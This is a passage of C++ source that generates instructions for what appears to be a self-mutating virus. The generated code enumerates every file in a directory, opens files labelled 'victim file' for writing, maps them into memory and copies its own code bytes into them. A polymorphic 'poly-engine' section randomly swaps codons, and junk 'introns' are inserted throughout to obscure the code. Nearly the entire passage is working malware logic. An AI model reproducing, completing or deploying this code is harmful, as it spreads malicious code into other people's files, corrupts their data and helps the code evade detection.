GetAddress(""nByteBlockToMov"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdD               ; RegD=nByteBlockToMov=c"" << endl; CreateAnIntron();

file << ""; do"" << endl; CreateAnIntron();
file << ""       _getEIP"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _saveJmpOff          ; mov BA2, eip"" << endl; CreateAnIntron();

file << ""       _nopsD               ; BC1=c"" << endl; CreateAnIntron();
file << ""       _save                ; BC2=c"" << endl; CreateAnIntron();

file << ""       _nopsB               ; BC1=InsEnd"" << endl; CreateAnIntron();
file << ""       _addsaved            ; BC1=InsEnd+c"" << endl; CreateAnIntron();
file << ""       _saveWrtOff          ; BA1=InsEnd+c"" << endl; CreateAnIntron();


file << ""       _pop                 ; If BC1=0: mutate"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""       _sub0001             ; Get the zer0 flag"" << endl; CreateAnIntron();
file << ""       _JnzDown"" << endl;
file << ""               _nopsA               ; BC1=InsStart"" << endl;
file << ""               _addsaved            ; BC1=InsStart+c"" << endl; 
file << ""               _getdata             ; BC1=*(InsStart+c)"" << endl; 
file << ""               _writeByte           ; *(InsEnd+c)==*(InsStart+c)"" << endl; 

file << ""       _nopsD"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _nopdD               ; RegD=c-1"" << endl; CreateAnIntron();

file << ""       _JnzUp"" << endl; CreateAnIntron();
file << ""; while --c"" << endl; CreateAnIntron();

file << ""; Already set:"" << endl; CreateAnIntron();
GetAddress(""InsStart"");
file << "";        _getdata"" << endl; CreateAnIntron();
file << "";        _nopdA               ; RegA=InsStart"" << endl; CreateAnIntron();

zer0(0);
addnumber(""144"");
file << ""       _nopdB"" << endl; CreateAnIntron();

GetAddress(""nBlockSize"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdD               ; RegD=nBlockSize=c"" << endl; CreateAnIntron();


file << ""; do"" << endl; CreateAnIntron();
file << ""       _getEIP"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _saveJmpOff          ; mov BA2, eip"" << endl; CreateAnIntron();

file << ""       _nopsD               ; BC1=c"" << endl; CreateAnIntron();
file << ""       _save                ; BC2=c"" << endl; CreateAnIntron();

file << ""       _nopsA               ; BC1=InsStart"" << endl; CreateAnIntron();
file << ""       _addsaved            ; BC1=InsStart+c"" << endl; CreateAnIntron();
file << ""       _saveWrtOff          ; BA1=InsStart+c"" << endl; CreateAnIntron();



file << ""       _pop                 ; If BC1=0: mutate"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""       _sub0001             ; Get the zer0 flag"" << endl; CreateAnIntron();
file << ""       _JnzDown"" << endl; 
file << ""               _nopREAL"" << endl; 
file << ""               _nopREAL"" << endl; 
file << ""               _nopsB"" << endl; 
file << ""               _writeByte           ; *(InsStart+c)==_nopREAL"" << endl; 

file << ""       _nopsD"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _nopdD               ; RegD=c-1"" << endl; CreateAnIntron();

file << ""       _JnzUp"" << endl; CreateAnIntron();
file << ""; while --c"" << endl; CreateAnIntron();

file << ""       _pop         ; remove (rand() % InsertThreshold1) from Stack"" << endl; CreateAnIntron();



zer0(0);
addnumber(""((HGTEnd1-HGTStart1)*8)"");

file << ""       _save"" << endl; CreateAnIntron();


file << ""       _getEIP"" << endl; CreateAnIntron();

file << ""     HGTStart1:"" << endl; CreateAnIntron();
addnumber(""3"");
file << ""       _addsaved"" << endl; CreateAnIntron();
file << ""       _nopdB                               ; Save Addresse in RegB"" << endl; CreateAnIntron();


CalcNewRandNumberAndSaveIt();

GetAddress(""RandomNumber"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA                               ; mov RegA, [RandomNumber]"" << endl; CreateAnIntron();

zer0(0);
file << ""       _nopdD                               ; mov RegD, 0"" << endl; CreateAnIntron();
addnumber(""HGTThreshold1"");

file << ""       _div                                 ; div BC1 <- RegD = rand() % HGTThreshold1"" << endl; CreateAnIntron();

file << ""       _nopsD"" << endl; CreateAnIntron();
file << ""       _save"" << endl; CreateAnIntron();
file << ""       _and                                 ; Is zero?"" << endl; CreateAnIntron();

file << ""       _JnzDown                             ; Simulate a JzDown"" << endl; 

file << ""               _nopREAL     ; BC1=0"" << endl;
file << ""               _nopREAL"" << endl; 
file << ""               _add0001"" << endl; 
file << ""               _JnzDown"" << endl; 


file << ""                       _nopsB     ; BC1!=0"" << endl; 
file << ""                       _call      ; jmp over HGT"" << endl; 
file << ""                       _nopREAL"" << endl; 
file << ""                       _nopREAL"" << endl;


GetAddress(""HGT_searchmask"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x002A2E2A"");
file << ""       _writeDWord"" << endl; CreateAnIntron();


GetAddress(""WIN32_FIND_DATA_struct"");
file << ""       _push"" << endl; CreateAnIntron();
GetAddress(""HGT_searchmask"");
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hFindFirstFileA"");


GetAddress(""HGT_FFHandle"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _writeDWord                   ; Save FindHandle"" << endl; CreateAnIntron();

file << ""       _getEIP"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _saveJmpOff          ; Start of the loop"" << endl; CreateAnIntron();


file << ""               ; Calculate the call addresse if the file is not ok"" << endl; CreateAnIntron();
zer0(0);
addnumber(""((HGTFileEnd1-HGTFileStart1)*8)"");
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _getEIP"" << endl; CreateAnIntron();

file << ""        HGTFileStart1:"" << endl; CreateAnIntron();
addnumber(""3"");
file << ""               _addsaved"" << endl; CreateAnIntron();
file << ""               _push                                ; Save Addresse on Stack"" << endl; CreateAnIntron();

GetAddress(""HGTFileHandle"");
file << ""                                                       ; be Closed later in any case,"" << endl; CreateAnIntron();
file << ""                                                       ; except for [Handle]==0x0"" << endl; CreateAnIntron();
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
file << ""               _writeDWord"" << endl; CreateAnIntron();

GetAddress(""HGTMapHandle"");
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
file << ""               _writeDWord"" << endl; CreateAnIntron();

GetAddress(""HGTDidInsert"");
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _writeDWord"" << endl; CreateAnIntron();

zer0(0);
addnumber(""FILE_ATTRIBUTE_DIRECTORY"");
file << ""               _save"" << endl; CreateAnIntron();
GetAddress(""WIN32_FIND_DATA_dwFileAttributes"");
file << ""               _getdata"" << endl; CreateAnIntron();
subsaved(0);

file << ""               _JnzDown                             ; Simulate a JzDown"" << endl; 
file << ""                       _pop     ; BC1=0"" << endl; 
file << ""                       _push"" << endl;
file << ""                       _call    ; If directory -> Do not open..."" << endl; 
file << ""                       _nopREAL"" << endl; 


CalcNewRandNumberAndSaveIt();

GetAddress(""RandomNumber"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _nopdA"" << endl; CreateAnIntron();

zer0(0);
file << ""               _nopdD"" << endl; CreateAnIntron();

addnumber(""5"");
file << ""               _div"" << endl; CreateAnIntron();

file << ""               _nopsD"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _and"" << endl; CreateAnIntron();

file << ""               _JnzDown                             ; Simulate a JzDown"" << endl; 

file << ""                       _nopREAL   ; BC=0"" << endl;
file << ""                       _nopREAL"" << endl; 
file << ""                       _add0001"" << endl; 
file << ""                       _JnzDown"" << endl; 

file << ""                               _pop     ; BC!=0"" << endl; 
file << ""                               _push"" << endl; 
file << ""                               _call    ; Not this file..."" << endl;
file << ""                               _nopREAL"" << endl; 


file << ""               ; OPEN FILE NOW"" << endl; CreateAnIntron();
zer0(0);
file << ""               _push"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
addnumber(""3"");
file << ""               _push"" << endl; CreateAnIntron();
zer0(0);
file << ""               _push"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""               _push"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
addnumber(""0xC0000000"");
file << ""               _push"" << endl; CreateAnIntron();
GetAddress(""WIN32_FIND_DATA_cFileName"");
file << ""               _push"" << endl; CreateAnIntron();
CallAPI(""hCreateFileA"");

GetAddress(""HGTFileHandle"");
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
file << ""               _nopsA"" << endl; CreateAnIntron();
file << ""               _writeDWord              ; mov dword[HGTFileHandle], RegA"" << endl; CreateAnIntron();

file << ""               _save"" << endl; CreateAnIntron();

file << ""               _nopsA"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""                                       ; -> if error: BC1=0"" << endl; CreateAnIntron();

file << ""               _JnzDown                             ; Simulate a JzDown"" << endl; 
file << ""                       _pop     ; BC1=0"" << endl; 
file << ""                       _push"" << endl; 
file << ""                       _call    ; If INVALID_HANDLE_VALUE -> Do not open..."" << endl; 
file << ""                       _nopREAL"" << endl; 

GetAddress(""HGTFileSize"");

file << ""               _push"" << endl; CreateAnIntron();
zer0(1);
file << ""               _addsaved"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
CallAPI(""hGetFileSize"");

GetAddress(""HGTFileSize"");
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
file << ""               _nopsA"" << endl; CreateAnIntron();
file << ""               _writeDWord              ; mov dword[HGTFileSize], RegA"" << endl; CreateAnIntron();

zer0(1);
file << ""               _push"" << endl; CreateAnIntron();
file << ""               _addsaved"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
zer0(0);
file << ""               _push"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""               _push"" << endl; CreateAnIntron();
zer0(0);
file << ""               _push"" << endl; CreateAnIntron();
GetAddress(""HGTFileHandle"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
CallAPI(""hCreateFileMappingA"");


GetAddress(""HGTMapHandle"");

file << ""               _saveWrtOff"" << endl; CreateAnIntron();
file << ""               _nopsA"" << endl; CreateAnIntron();
file << ""               _writeDWord               ; mov dword[HGTMapHandle], RegA"" << endl; CreateAnIntron();

file << ""               _save"" << endl; CreateAnIntron();

file << ""               _nopsA"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _and"" << endl; CreateAnIntron();
file << ""               _JnzDown                             ; Simulate a JzDown"" << endl; 

file << ""                       _pop     ; BC1=0"" << endl; 
file << ""                       _push"" << endl; 
file << ""                       _call    ; If NULL -> Do not open..."" << endl; 
file << ""                       _nopREAL"" << endl; 

GetAddress(""HGTFileSize"");

file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push   ; [HGTFileSize]"" << endl; CreateAnIntron();
zer0(1);
file << ""               _push   ; 0"" << endl; CreateAnIntron();
file << ""               _push   ; 0"" << endl; CreateAnIntron();
addnumber(""2"");
file << ""               _push"" << endl; CreateAnIntron();
zer0(1);
file << ""               _addsaved"" << endl; CreateAnIntron();
file << ""               _push   ; MapHandle"" << endl; CreateAnIntron();

CallAPI(""hMapViewOfFile"");

GetAddress(""HGTMapPointer"");

file << ""               _saveWrtOff"" << endl; CreateAnIntron();
file << ""               _nopsA"" << endl; CreateAnIntron();
file << ""               _writeDWord              ; mov dword[HGTMapPointer], RegA"" << endl; CreateAnIntron();

file << ""               _nopsA"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _and"" << endl; CreateAnIntron();
file << ""               _JnzDown         ; Simulate a JzDown"" << endl; 
file << ""                       _pop     ; BC1=0"" << endl; 
file << ""                       _push"" << endl; 
file << ""                       _call    ; If NULL -> Do not open..."" << endl;
file << ""                       _nopREAL"" << endl;


CalcNewRandNumberAndSaveIt();

GetAddress(""RandomNumber"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _nopdA"" << endl; CreateAnIntron();

zer0(0);
file << ""               _nopdD"" << endl; CreateAnIntron();

GetAddress(""HGTFileSize"");
file << ""               _getdata"" << endl; CreateAnIntron();

file << ""               _div"" << endl; CreateAnIntron();

file << ""               _nopsD"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

GetAddress(""HGTMapPointer"");
file << ""               _getdata"" << endl; CreateAnIntron();

file << ""               _addsaved"" << endl; CreateAnIntron();

file << ""               _push                ; Start in sourcefile"" << endl; CreateAnIntron();


CalcNewRandNumberAndSaveIt();

GetAddress(""RandomNumber"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _nopdA"" << endl; CreateAnIntron();

zer0(0);
file << ""               _nopdD"" << endl; CreateAnIntron();

GetAddress(""FileSize"");
file << ""               _getdata"" << endl; CreateAnIntron();

file << ""               _div"" << endl; CreateAnIntron();

file << ""               _nopsD"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

GetAddress(""MapPointer"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _addsaved"" << endl; CreateAnIntron();

file << ""               _push                ; Start in my file"" << endl; CreateAnIntron();


CalcNewRandNumberAndSaveIt();

GetAddress(""RandomNumber"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _nopdA"" << endl; CreateAnIntron();

zer0(0);
file << ""               _nopdD"" << endl; CreateAnIntron();

addnumber(""11"");

file << ""               _div"" << endl; CreateAnIntron();
file << ""               _nopsD"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""               _nopdD"" << endl; CreateAnIntron();

file << ""               ; Size in RegD"" << endl; CreateAnIntron();


file << ""               _pop         ; Start in my file"" << endl; CreateAnIntron();
file << ""               _nopdB"" << endl; CreateAnIntron();


file << ""               _pop         ; Start in victim file"" << endl; CreateAnIntron();
file << ""               _nopdA"" << endl; CreateAnIntron();

file << ""               _pushall"" << endl; CreateAnIntron();
file << ""               _getEIP"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();

file << ""               _saveJmpOff          ; Save everything, especially the old BA2"" << endl; CreateAnIntron();

file << ""                       _nopsB"" << endl; CreateAnIntron();
file << ""                       _saveWrtOff"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""                       _nopdB"" << endl; CreateAnIntron();

file << ""                       _nopsA"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""                       _nopdA"" << endl; CreateAnIntron();
file << ""                       _sub0001"" << endl; CreateAnIntron();
file << ""                       _getdata"" << endl; CreateAnIntron();

file << ""                       _writeByte"" << endl; CreateAnIntron();

file << ""                       _nopsD"" << endl; CreateAnIntron();
file << ""                       _sub0001"" << endl; CreateAnIntron();
file << ""                       _nopdD"" << endl; CreateAnIntron();

file << ""               _JnzUp"" << endl; CreateAnIntron();
file << ""               _popall              ; Get old BA2 again"" << endl; CreateAnIntron();

GetAddress(""HGTDidInsert"");
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
file << ""               _writeDWord"" << endl; CreateAnIntron();


file << ""               _push        ; trash"" << endl; CreateAnIntron();

file << ""        HGTFileEnd1:"" << endl; CreateAnIntron();
file << ""               _pop         ; from call"" << endl; CreateAnIntron();
file << ""               _pop         ; saved address"" << endl; CreateAnIntron();

GetAddress(""HGTMapPointer"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
CallAPI(""hUnmapViewOfFile"");


file << ""               _getDO"" << endl; CreateAnIntron();
addnumber(""(hCloseHandle-DataOffset)"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _nopdA       ; Save API in RegA"" << endl; CreateAnIntron();

GetAddress(""HGTMapHandle"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _and"" << endl; CreateAnIntron();

file << ""               _JnzDown"" << endl; 
file << ""                  ; BC==0"" << endl; 
file << ""                  _nopREAL"" << endl;
file << ""                  _nopREAL"" << endl;
file << ""                  _add0001"" << endl;
file << ""                  _JnzDown"" << endl;

file << ""                       ; BC!=0"" << endl;
file << ""                       _nopsA       ; get API offset"" << endl;
file << ""                       _call        ; call CloseHandle, dword[HGTMapHandle]"" << endl;
file << ""                       _push        ; Trash"" << endl;
file << ""                       _nopREAL"" << endl;


file << ""               _pop         ; remove trash"" << endl; CreateAnIntron();

file << ""               _getDO"" << endl; CreateAnIntron();
addnumber(""(hCloseHandle-DataOffset)"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _nopdA       ; Save API in RegA"" << endl; CreateAnIntron();

GetAddress(""HGTFileHandle"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _and"" << endl; CreateAnIntron();

file << ""               _JnzDown"" << endl;
file << ""                  ; BC==0"" << endl; 
file << ""                  _nopREAL"" << endl; 
file << ""                  _nopREAL"" << endl; 
file << ""                  _add0001"" << endl; 
file << ""                  _JnzDown"" << endl; 

file << ""                       ; BC!=0"" << endl;
file << ""                       _nopsA       ; get API offset"" << endl;
file << ""                       _call        ; call CloseHandle, dword[HGTFileHandle]"" << endl;
file << ""                       _push        ; Trash"" << endl;
file << ""                       _nopREAL"" << endl;

file << ""               _pop         ; remove trash"" << endl; CreateAnIntron();


GetAddress(""HGTDidInsert"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push                ; 0...written / -1...not written"" << endl; CreateAnIntron();

GetAddress(""WIN32_FIND_DATA_struct"");
file << ""               _push"" << endl; CreateAnIntron();
GetAddress(""HGT_FFHandle"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();

CallAPI(""hFindNextFileA"");


file << ""               _pop                     ; HGTDidInsert"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _nopsA                   ; If nonzero: Next file!"" << endl; CreateAnIntron();
file << ""       _and"" << endl; CreateAnIntron();
file << ""       _JnzUp                           ; End of the loop"" << endl; CreateAnIntron();


file << ""       _push                ; Trash to stack"" << endl; CreateAnIntron();
file << ""       HGTEnd1:"" << endl; CreateAnIntron();

file << ""       _pop                 ; Align stack (Trash or Return address from _call)"" << endl; CreateAnIntron();



CalcNewRandNumberAndSaveIt();

GetAddress(""RPAminoAcid1"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();

GetAddress(""RandomNumber"");

file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA                   ; mov eax, [RandomNumber]"" << endl; CreateAnIntron();


zer0(0);
file << ""       _nopdD                   ; mov edx, 0"" << endl; CreateAnIntron();

addnumber(""256"");

file << ""       _div                     ; div ebx"" << endl; CreateAnIntron();

file << ""       _nopsD                   ; BC1=rand%256"" << endl; CreateAnIntron();

file << ""       _writeDWord              ; Save amino acid to compare."" << endl; CreateAnIntron();


file << ""       _push"" << endl; CreateAnIntron();
zer0(0);
addnumber(""3"");
file << ""       _save"" << endl; CreateAnIntron();

file << ""       _pop"" << endl; CreateAnIntron();
file << ""       _shl                     ; BC1=(rand%256)*8"" << endl; CreateAnIntron();
file << ""       _save"" << endl; CreateAnIntron();


GetAddress(""MapPointer"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _addsaved                ; MapPoint+(rand%256)*8"" << endl; CreateAnIntron();

addnumber(""(CodeStart+(StartAlphabeth-start))"");
file << ""       _push"" << endl; CreateAnIntron();
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA                   ; First 4 bytes of amino acid in RegA"" << endl; CreateAnIntron();

file << ""       _pop"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdB                   ; 2nd 4 bytes of amino acid in RegB"" << endl; CreateAnIntron();

GetAddress(""MapPointer"");
file << ""       _getdata"" << endl; CreateAnIntron();

addnumber(""(CodeStart+(StartAlphabeth-start))"");
file << ""       _nopdD"" << endl; CreateAnIntron();


file << ""    ; Start of loop:"" << endl; CreateAnIntron();
file << ""       _getEIP"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _saveJmpOff"" << endl; CreateAnIntron();

zer0(0);
addnumber(""((RPBlock1End1-RPBlock1Start1)*8)"");
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _getEIP"" << endl; CreateAnIntron();

file << ""           RPBlock1Start1:"" << endl; CreateAnIntron();
addnumber(""3"");
file << ""               _addsaved"" << endl; CreateAnIntron();
file << ""               _push                               ; Save Addresse at Stack"" << endl; CreateAnIntron();


file << ""               _pushall"" << endl; CreateAnIntron();
CalcNewRandNumberAndSaveIt();

GetAddress(""RPAminoAcid2"");
file << ""                       _saveWrtOff"" << endl; CreateAnIntron();

GetAddress(""RandomNumber"");

file << ""                       _getdata"" << endl; CreateAnIntron();
file << ""                       _nopdA                   ; mov eax, [RandomNumber]"" << endl; CreateAnIntron();

zer0(0);
file << ""                       _nopdD                   ; mov edx, 0"" << endl; CreateAnIntron();

addnumber(""256"");

file << ""                       _div                     ; div ebx"" << endl; CreateAnIntron();

file << ""                       _nopsD"" << endl; CreateAnIntron();
file << ""                       _writeDWord"" << endl; CreateAnIntron();

file << ""               _popall"" << endl; CreateAnIntron();

file << ""               _pushall"" << endl; CreateAnIntron();
GetAddress(""RPAminoAcid1"");
file << ""                  _getdata"" << endl; CreateAnIntron();
file << ""                  _nopdA"" << endl; CreateAnIntron();
GetAddress(""RPAminoAcid2"");
file << ""                  _getdata"" << endl; CreateAnIntron();
file << ""                  _nopdB"" << endl; CreateAnIntron();

file << ""               _popall"" << endl; CreateAnIntron();

zer0(0);
addnumber(""3"");
file << ""               _save"" << endl; CreateAnIntron();

GetAddress(""RPAminoAcid2"");
file << ""               _getdata"" << endl; CreateAnIntron();

file << ""               _shl         ; *8"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _nopsD        ; Get start of Alphabeth in Map"" << endl; CreateAnIntron();

file << ""               _addsaved"" << endl; CreateAnIntron();

file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _nopsA"" << endl; CreateAnIntron();
subsaved(0);

file << ""               _JnzDown     ; Simulate JzDown"" << endl;

file << ""                       _nopREAL     ; BC1=0"" << endl;
file << ""                       _nopREAL"" << endl;
file << ""                       _add0001"" << endl;
file << ""                       _JnzDown"" << endl;

file << ""                               _nopREAL     ; Not equal"" << endl;
file << ""                               _pop"" << endl;
file << ""                               _push"" << endl;
file << ""                               _call        ; jmp to RPBlock1End"" << endl;

file << ""       ; First 4 bytes are equal"" << endl; CreateAnIntron();
file << ""               _pop         ; Old Call-address"" << endl; CreateAnIntron();

zer0(0);
addnumber(""((RPBlock2End1-RPBlock2Start1)*8)"");
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _getEIP"" << endl; CreateAnIntron();

file << ""           RPBlock2Start1:"" << endl; CreateAnIntron();
addnumber(""3"");
file << ""               _addsaved"" << endl; CreateAnIntron();
file << ""               _push                               ; Save Addresse at Stack"" << endl; CreateAnIntron();


zer0(0);
addnumber(""3"");
file << ""               _save"" << endl; CreateAnIntron();

GetAddress(""RPAminoAcid2"");
file << ""               _getdata"" << endl; CreateAnIntron();

file << ""               _shl         ; *8"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _nopsD        ; Get start of Alphabeth in Map"" << endl; CreateAnIntron();

file << ""               _addsaved"" << endl; CreateAnIntron();

addnumber(""4"");

file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _nopsB       ; second 4 bytes"" << endl; CreateAnIntron();
subsaved(0);
file << ""               _JnzDown"" << endl;

file << ""                       _nopREAL     ; BC1=0"" << endl;
file << ""                       _pop"" << endl;
file << ""                       _push"" << endl;
file << ""                       _call        ; RPBlock2End"" << endl;

file << ""               _push        ; not equal! trash to stack"" << endl; CreateAnIntron();

file << ""           RPBlock1End1:        ; Not equal amino acids"" << endl; CreateAnIntron();
file << ""               _pop         ; remove "" << static_cast<char>(34) << ""call"" << static_cast<char>(34) << ""-return address"" << endl; CreateAnIntron();
file << ""               _pop         ; RPBlock1End-Jmp Address"" << endl; CreateAnIntron();

zer0(0);
addnumber(""15"");
file << ""               _save"" << endl; CreateAnIntron();

GetAddress(""RandomNumber"");
file << ""               _getdata     ; BC1=random"" << endl; CreateAnIntron();

file << ""               _shr         ; BC1=random >> 15 (to get new small random number without calling the 32bit RND engine again)"" << endl; CreateAnIntron();
file << ""               _and         ; BC1=(random >> 15) % 0000 1111b"" << endl; CreateAnIntron();
file << ""       _JnzUp               ; If not zero -> Next loop!"" << endl; CreateAnIntron();


file << ""       ; Not found any equivalences..."" << endl; CreateAnIntron();

zer0(0);
addnumber(""((RPBlock3End1-RPBlock3Start1)*8)"");
file << ""       _save"" << endl; CreateAnIntron();

file << ""       _getEIP"" << endl; CreateAnIntron();

file << ""     RPBlock3Start1:"" << endl; CreateAnIntron();
addnumber(""3"");
file << ""       _addsaved"" << endl; CreateAnIntron();

file << ""       _call        ; jmp to end of poly-engine: RPBlock3End"" << endl; CreateAnIntron();




file << ""     RPBlock2End1:      ; Equal amino acids found"" << endl; CreateAnIntron();
file << ""       _pop         ; remove "" << static_cast<char>(34) << ""call"" << static_cast<char>(34) << ""-return address"" << endl; CreateAnIntron();
file << ""       _pop         ; RPBlock2End-Jmp Address"" << endl; CreateAnIntron();


GetAddress(""MapPointer"");
file << ""       _getdata"" << endl; CreateAnIntron();

addnumber(""(CodeStart+(StAmino-start))"");
file << ""       _nopdD"" << endl; CreateAnIntron();

GetAddress(""RPAminoAcid1"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();

GetAddress(""RPAminoAcid2"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdB"" << endl; CreateAnIntron();

zer0(0);
GetAddress(""FileSize"");
file << ""       _getdata"" << endl; CreateAnIntron();
addnumber(""(0xFFFFFFFF-(CodeStart+(StAmino-start))-1000)"");
file << ""       _push"" << endl; CreateAnIntron();

file << ""       _getEIP"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _saveJmpOff"" << endl; CreateAnIntron();

file << ""               _nopsD       ; Codon-Sequence Start"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _pop"" << endl; CreateAnIntron();
file << ""               _push        ; counter"" << endl; CreateAnIntron();

file << ""               _addsaved"" << endl; CreateAnIntron();
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();

zer0(0);
addnumber(""255"");
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _pop"" << endl; CreateAnIntron();
file << ""               _and         ; BC1=one byte"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _nopsA"" << endl; CreateAnIntron();

subsaved(0);
file << ""               _JnzDown"" << endl;
file << ""                       _nopsB"" << endl;
file << ""                       _writeByte           ; If equal: exchange codon!"" << endl;
file << ""                       _nopREAL"" << endl;
file << ""                       _nopREAL"" << endl;

file << ""               _pushall"" << endl; CreateAnIntron();
CalcNewRandNumberAndSaveIt();
file << ""               _popall"" << endl; CreateAnIntron();

zer0(0);
addnumber(""1"");
file << ""               _save"" << endl; CreateAnIntron();

GetAddress(""RandomNumber"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _and"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""               _save                ; BC2=(rand%8)+1"" << endl; CreateAnIntron();

file << ""               _pop"" << endl; CreateAnIntron();
subsaved(0);
file << ""               _push"" << endl; CreateAnIntron();

zer0(0);
addnumber(""4293918720"");
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _pop"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
file << ""               _and                 ; BC1=(counter%0xFFF0 0000)"" << endl; CreateAnIntron();

file << ""               _JnzDown"" << endl;
